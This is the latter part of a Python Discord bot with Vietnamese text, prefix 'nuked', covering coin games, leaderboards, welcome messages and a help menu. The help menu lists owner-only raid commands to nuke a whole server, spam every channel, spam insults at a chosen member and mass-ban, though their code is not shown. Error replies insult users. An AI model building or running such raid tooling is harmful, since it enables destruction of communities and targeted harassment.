        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_nsfw.error
async def set_nsfw_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH CÀI ĐẶT KÊNH (WELCOME, GOODBYE, LEVEL, LOG) ====================
@bot.command(name="setwelcome")
@is_bot_owner()
async def set_welcome_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    WELCOME_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(
        title="🎉 THIẾT LẬP KÊNH CHÀO MỪNG",
        description=f"✅ Đã thiết lập kênh chào mừng thành công tại {channel.mention}!",
        color=0x00FF00
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_welcome_channel.error
async def set_welcome_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setgoodbye")
@is_bot_owner()
async def set_goodbye_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    GOODBYE_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(
        title="😢 THIẾT LẬP KÊNH TẠM BIỆT",
        description=f"✅ Đã thiết lập kênh tạm biệt thành công tại {channel.mention}!",
        color=0xFF0000
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_goodbye_channel.error
async def set_goodbye_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setlevelchannel")
@is_bot_owner()
async def set_level_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    SERVER_LEVEL_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(
        title="📈 THIẾT LẬP KÊNH LEVEL UP",
        description=f"✅ Đã thiết lập kênh thông báo Level Up tại {channel.mention}!",
        color=0xFFD700
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_level_channel.error
async def set_level_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="channelslog")
@is_bot_owner()
async def set_log_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    SERVER_LOG_CHANNELS[str(ctx.guild.id)] = channel.id
    save_all_data()
    embed = discord.Embed(
        title="📋 THIẾT LẬP KÊNH LOG SỰ KIỆN",
        description=f"✅ Đã đặt kênh Log sự kiện tại {channel.mention} thành công!",
        color=0x00CCFF
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_log_channel.error
async def set_log_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH KINH TẾ & GIẢI TRÍ (CẢI TIẾN) ====================
@bot.command(name="balance", aliases=["bal", "money", "coin"])
async def check_balance(ctx, member: discord.Member = None):
    target = member or ctx.author
    coins = get_user_coins(target.id)
    embed = discord.Embed(
        title="💰 TÀI THẢN CỦA BẠN",
        description=f"👤 **Thành viên:** {target.mention}\n💵 **Số coin hiện có:** `{coins:,}` coin",
        color=0xFFD700
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="daily")
async def daily_reward(ctx):
    uid = str(ctx.author.id)
    now = datetime.now(timezone.utc)
    last = daily_cooldowns.get(uid)
    if last:
        last_time = datetime.fromisoformat(last)
        if (now - last_time) < timedelta(hours=24):
            remaining = timedelta(hours=24) - (now - last_time)
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            await ctx.send(f"⏳ Bạn đã nhận daily rồi! Vui lòng chờ **{hours}h {minutes}p** nữa.")
            return

    reward = random.randint(500, 2000)
    add_coins(ctx.author.id, reward)
    daily_cooldowns[uid] = now.isoformat()
    save_json(DAILY_FILE, daily_cooldowns)
    embed = discord.Embed(
        title="🎁 PHẦN QUÀ HÀNG NGÀY",
        description=f"🎉 Bạn đã nhận thành công **+{reward:,} coin** điểm danh hôm nay!",
        color=0x00FF00
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="work")
async def work_command(ctx):
    jobs = [
        "Lập trình Bot Discord", "Rửa bát thuê", "Đi bán vé số",
        "Chạy Grab xe ôm", "Giao hàng Shopee", "Bán trà đá vỉa hè",
        "Sửa máy tính", "Viết blog", "Edit video", "Chụp ảnh cưới"
    ]
    job = random.choice(jobs)
    earned = random.randint(200, 800)
    add_coins(ctx.author.id, earned)
    embed = discord.Embed(
        title="🛠️ LÀM VIỆC CHĂM CHỈ",
        description=f"💼 Bạn đã làm công việc **{job}** và thu về **+{earned:,} coin**!",
        color=0x00CCFF
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="give", aliases=["pay"])
async def give_coins(ctx, member: discord.Member, amount: int):
    if amount <= 0:
        await ctx.send("❌ Số coin chuyển phải lớn hơn 0!")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự chuyển coin cho chính mình!")
        return
    if not subtract_coins(ctx.author.id, amount):
        await ctx.send("❌ Bạn không có đủ số coin để chuyển!")
        return
    add_coins(member.id, amount)
    embed = discord.Embed(
        title="💸 GIAO DỊCH CHUYỂN COIN",
        description=f"✅ {ctx.author.mention} đã chuyển thành công **{amount:,} coin** cho {member.mention}!",
        color=0x00FF00
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="coinflip", aliases=["cf"])
async def coinflip(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin để cược!")
        return
    choice = choice.lower()
    if choice not in ["h", "t", "ngua", "up"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn không hợp lệ! Dùng `h` (Ngửa) hoặc `t` (Úp).")
        return

    result = random.choice(["h", "t"])
    res_str = "Ngửa (Head)" if result == "h" else "Úp (Tail)"
    user_choice_str = "Ngửa (Head)" if choice in ["h", "ngua"] else "Úp (Tail)"

    if (choice in ["h", "ngua"] and result == "h") or (choice in ["t", "up"] and result == "t"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="🪙 TUNG ĐỒNG XU",
            description=f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n🎉 **BẠN THẮNG!** Nhận **+{win:,} coin**!",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🪙 TUNG ĐỒNG XU",
            description=f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n💀 **BẠN THUA!** Mất **-{bet:,} coin**.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)

@bot.command(name="slots")
async def slots(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return

    emojis = ["🍎", "🍋", "🍒", "🍇", "💎", "7️⃣"]
    s1, s2, s3 = random.choice(emojis), random.choice(emojis), random.choice(emojis)

    msg = f"🎰 **SLOTS MACHINE** 🎰\n| {s1} | {s2} | {s3} |\n"
    if s1 == s2 == s3:
        win = bet * 5
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="🎰 MÁY SLOTS",
            description=msg + f"🔥 **JACKPOT 3/3!** Bạn thắng gấp 5 lần: **+{win:,} coin**!",
            color=0xFFD700
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    elif s1 == s2 or s2 == s3 or s1 == s3:
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="🎰 MÁY SLOTS",
            description=msg + f"🎉 **TRÚNG 2/3!** Bạn thắng **+{win:,} coin**!",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🎰 MÁY SLOTS",
            description=msg + f"💀 **THUA RỒI!** Bạn mất **-{bet:,} coin**.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)

@bot.command(name="rps")
async def rps(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return
    options = {"r": "🪨 Búa", "p": "📄 Bao", "s": "✂️ Kéo"}
    user_c = choice.lower()
    if user_c not in options:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy chọn `r` (Búa), `p` (Bao), hoặc `s` (Kéo)!")
        return
    bot_c = random.choice(["r", "p", "s"])
    msg = f"Bạn chọn **{options[user_c]}** 🆚 Bot chọn **{options[bot_c]}**\n"
    if user_c == bot_c:
        add_coins(ctx.author.id, bet)
        embed = discord.Embed(
            title="✂️ KÉO BÚA BAO",
            description=msg + "🤝 **HÒA RỒI!** Đã hoàn lại tiền cược.",
            color=0xFFFF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    elif (user_c == "r" and bot_c == "s") or (user_c == "p" and bot_c == "r") or (user_c == "s" and bot_c == "p"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        embed = discord.Embed(
            title="✂️ KÉO BÚA BAO",
            description=msg + f"🎉 **BẠN THẮNG!** Nhận **+{win:,} coin**!",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="✂️ KÉO BÚA BAO",
            description=msg + f"💀 **BẠN THUA!** Mất **-{bet:,} coin**.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)

# ==================== LỆNH HỆ THỐNG & THÔNG TIN ====================
@bot.command(name="stats")
async def server_stats(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"📊 THỐNG KÊ SERVER {guild.name.upper()}",
        color=0x00FF00
    )
    embed.add_field(name="🆔 Server ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="👑 Chủ Server", value=guild.owner.mention if guild.owner else "Không rõ", inline=True)
    embed.add_field(name="👥 Số thành viên", value=f"`{guild.member_count}` người", inline=True)
    embed.add_field(name="💬 Kênh Văn Bản", value=f"`{len(guild.text_channels)}` kênh", inline=True)
    embed.add_field(name="🔊 Kênh Thoại", value=f"`{len(guild.voice_channels)}` kênh", inline=True)
    embed.add_field(name="🎭 Số lượng Role", value=f"`{len(guild.roles)}` roles", inline=True)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(
        title="🏓 PONG!",
        description=f"⏱️ Độ trễ: **{latency}ms**",
        color=0x00FF00 if latency < 200 else 0xFF9900
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="topcoin")
async def top_coin(ctx):
    sorted_coins = sorted(user_coins.items(), key=lambda x: x[1], reverse=True)[:10]
    if not sorted_coins:
        await ctx.send("Chưa có dữ liệu coin.")
        return
    desc = ""
    for idx, (uid, coins) in enumerate(sorted_coins, 1):
        user = bot.get_user(int(uid))
        name = user.name if user else f"ID:{uid}"
        desc += f"**{idx}.** {name} – `{coins:,}` coin\n"
    embed = discord.Embed(
        title="🏆 BẢNG XẾP HẠNG COIN",
        description=desc,
        color=0xFFD700
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@bot.command(name="toplevel")
async def top_level(ctx):
    sorted_levels = sorted(USER_LEVELS.items(), key=lambda x: x[1]["level"], reverse=True)[:10]
    if not sorted_levels:
        await ctx.send("Chưa có dữ liệu level.")
        return
    desc = ""
    for idx, (uid, data) in enumerate(sorted_levels, 1):
        user = bot.get_user(int(uid))
        name = user.name if user else f"ID:{uid}"
        desc += f"**{idx}.** {name} – Level {data['level']} (Exp: {data['exp']})\n"
    embed = discord.Embed(
        title="🏆 BẢNG XẾP HẠNG LEVEL",
        description=desc,
        color=0x00BFFF
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

# ==================== MENU HELP CỰC KỲ CHI TIẾT ====================
HELP_CATEGORIES = {
    "👑 Lệnh Độc Quyền Owner": {
        "emoji": "👑",
        "description": "Bộ công cụ tối cao dành riêng cho Boss Bảo và Owners – quản trị server, phá hoại, kiểm soát tuyệt đối.",
        "commands": {
            "nuked nuke": "🔥 Phá hoại toàn bộ Server (cần xác nhận)",
            "nuked spam": "⚡ Bắt đầu spam tất cả các kênh",
            "nuked stopspam": "🛑 Dừng hệ thống spam",
            "nuked spamroast @user <số>": "🔥 Spam chửi thành viên chỉ định",
            "nuked kick @user [lý do]": "🦵 Kick thành viên ra khỏi server",
            "nuked ban @user [lý do]": "🔨 Cấm thành viên khỏi server",
            "nuked unban <id>": "✅ Gỡ ban cho thành viên qua ID",
            "nuked massban @user1 @user2...": "🔨 Cấm nhiều người cùng lúc",
            "nuked mute @user [phút]": "🔇 Tắt tiếng (timeout) thành viên",
            "nuked unmute @user": "🔊 Bỏ tắt tiếng thành viên",
            "nuked createchannel <tên>": "🆕 Tạo kênh văn bản mới",
            "nuked deletechannel [#channel]": "🗑️ Xóa kênh được chọn",
            "nuked lockchannel [#channel]": "🔒 Khóa kênh văn bản",
            "nuked unlockchannel [#channel]": "🔓 Mở khóa kênh văn bản",
            "nuked createrole <tên>": "🎭 Tạo role mới",
            "nuked deleterole <tên>": "🗑️ Xóa role khỏi server",
            "nuked role @user <tên role>": "🎭 Gán role cho thành viên",
            "nuked removerole @user <tên role>": "🎭 Xóa role khỏi thành viên",
            "nuked purge all": "🧹 Xóa sạch toàn bộ tin nhắn server",
            "nuked clear <số>": "🧹 Xóa tin nhắn trong kênh (tối đa 1000)",
            "nuked createcategory <tên>": "📁 Tạo Danh mục (Category) mới",
            "nuked move @user #voice": "🚪 Di chuyển thành viên sang voice khác",
            "nuked settopic #channel <nội dung>": "📝 Đặt chủ đề cho kênh",
            "nuked setnsfw #channel <true/false>": "🔞 Bật/Tắt chế độ NSFW",
            "nuked setwelcome #channel": "🎉 Đặt kênh chào mừng",
            "nuked setgoodbye #channel": "😢 Đặt kênh tạm biệt",
            "nuked setlevelchannel #channel": "📈 Đặt kênh thông báo Level Up",
            "nuked channelslog #channel": "📋 Đặt kênh log sự kiện"
        }
    },
    "💰 Kinh Tế & Giải Trí": {
        "emoji": "💰",
        "description": "Hệ thống mini-game, cá cược, kiếm coin và chuyển tiền phong phú.",
        "commands": {
            "nuked balance [@user]": "💰 Xem số dư coin của bạn hoặc người khác",
            "nuked daily": "🎁 Nhận quà coin miễn phí mỗi ngày (24h)",
            "nuked work": "🛠️ Làm việc kiếm coin",
            "nuked give @user <số>": "💸 Chuyển coin cho người khác",
            "nuked coinflip <số> <h/t>": "🪙 Tung đồng xu x2 tiền cược",
            "nuked slots <số>": "🎰 Quay hũ Slots – jackpot x5",
            "nuked rps <số> <r/p/s>": "✂️ Oẳn tù tì x2 tiền cược"
        }
    },
    "📊 Thông Tin & Hệ Thống": {
        "emoji": "📊",
        "description": "Xem thống kê server, độ trễ, bảng xếp hạng.",
        "commands": {
            "nuked stats": "📊 Xem thông số chi tiết của server",
            "nuked ping": "🏓 Kiểm tra độ trễ của bot",
            "nuked topcoin": "🏆 Bảng xếp hạng những người có coin nhiều nhất",
            "nuked toplevel": "🏆 Bảng xếp hạng level cao nhất"
        }
    }
}

class HelpSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(
                label="🏠 Trang Chủ",
                value="Home",
                description="Quay lại giao diện chính",
                emoji="🏠"
            )
        ]
        for cat_name, data in HELP_CATEGORIES.items():
            emoji = data.get("emoji", "📌")
            label = cat_name.replace(emoji, "").strip()
            options.append(
                discord.SelectOption(
                    label=label,
                    value=cat_name,
                    description=data.get("description", "")[:80],
                    emoji=emoji
                )
            )
        super().__init__(placeholder="🔍 Chọn danh mục lệnh...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "Home":
            embed = discord.Embed(
                title="✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
                description=(
                    "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
                    "Hãy chọn danh mục ở Menu thả xuống để khám phá danh sách lệnh chi tiết.\n\n"
                    "📌 **Prefix mặc định:** `nuked`\n"
                    "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao\n"
                    "💡 **Gợi ý:** Sử dụng các lệnh kinh tế để kiếm coin và tham gia game!"
                ),
                color=0xFF69B4
            )
            embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
            embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=interaction.client.user.display_avatar.url)
            await interaction.response.edit_message(embed=embed, view=self.view)
        else:
            data = HELP_CATEGORIES.get(selected, {})
            cmds = data.get("commands", {})
            desc = data.get("description", "")
            cmd_text = ""
            for cmd, detail in cmds.items():
                # Tách emoji nếu có
                parts = cmd.split(" ", 1)
                if len(parts) == 2:
                    cmd_display = parts[1]
                else:
                    cmd_display = cmd
                # Lấy emoji từ detail (thường có ở đầu)
                detail_emoji = detail.split()[0] if detail else "📌"
                cmd_text += f"• **`{cmd_display}`** – {detail}\n"

            embed = discord.Embed(
                title=f"{selected}",
                description=f"💡 **Mô tả:** {desc}\n\n{cmd_text}" if cmd_text else "Chưa có lệnh nào trong mục này.",
                color=0x00FFCC
            )
            embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
            embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=interaction.client.user.display_avatar.url)
            await interaction.response.edit_message(embed=embed, view=self.view)

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
        self.add_item(HelpSelect())

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
        description=(
            "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
            "Hãy chọn danh mục ở Menu thả xuống để khám phá danh sách lệnh chi tiết.\n\n"
            "📌 **Prefix mặc định:** `nuked`\n"
            "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao\n"
            "💡 **Gợi ý:** Sử dụng các lệnh kinh tế để kiếm coin và tham gia game!"
        ),
        color=0xFF69B4
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=bot.user.display_avatar.url)
    view = HelpView()
    await ctx.send(embed=embed, view=view)

# ==================== SỰ KIỆN ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi động thành công và sẵn sàng hoạt động!")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Xử lý lệnh
    await bot.process_commands(message)

    # Tag owner
    if message.mentions:
        for user in message.mentions:
            if user.id in BOT_OWNERS:
                await message.reply("oi tag gì thế thích Boss Bảo tui à s k ns?")
                break

    # Tự động tăng exp (chỉ trong kênh text, không tính lệnh)
    if not message.content.startswith("nuked") and not message.content.startswith("nuked "):
        # Tăng exp ngẫu nhiên từ 1-10
        exp_gain = random.randint(1, 10)
        old_level = get_user_level(message.author.id)
        new_level = add_exp(message.author.id, exp_gain)
        if new_level > old_level:
            # Thông báo level up
            guild_id = str(message.guild.id)
            if guild_id in SERVER_LEVEL_CHANNELS:
                ch_id = SERVER_LEVEL_CHANNELS[guild_id]
                channel = message.guild.get_channel(ch_id)
                if channel:
                    embed = discord.Embed(
                        title="📈 LEVEL UP!",
                        description=f"🎉 {message.author.mention} vừa lên level **{new_level}**!",
                        color=0xFFD700
                    )
                    embed.set_thumbnail(url=message.author.display_avatar.url)
                    try:
                        await channel.send(embed=embed)
                    except:
                        pass

@bot.event
async def on_member_join(member):
    guild_id = str(member.guild.id)
    if guild_id in WELCOME_CHANNELS:
        ch_id = WELCOME_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="🎉 **CHÀO MỪNG THÀNH VIÊN MỚI** 🎉",
                description=f"Chào mừng {member.mention} đã tham gia vào **{member.guild.name}**! Chúc bạn có những phút giây vui vẻ!",
                color=0x00FF00
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            try:
                await channel.send(embed=embed)
            except:
                pass

@bot.event
async def on_member_remove(member):
    guild_id = str(member.guild.id)
    if guild_id in GOODBYE_CHANNELS:
        ch_id = GOODBYE_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="😢 **TẠM BIỆT THÀNH VIÊN** 😢",
                description=f"Tạm biệt {member.mention}, chúc bạn luôn may mắn và thành công trên con đường sắp tới!",
                color=0xFF0000
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            try:
                await channel.send(embed=embed)
            except:
                pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"[ERROR] {error}")

# ==================== CHẠY BOT ====================
if __name__ == "__main__":
    keep_alive()
    if DISCORD_TOKEN:
        bot.run(DISCORD_TOKEN)
    else:
        print("❌ Lỗi: Chưa cấu hình TOKEN trong Environment Variables!")
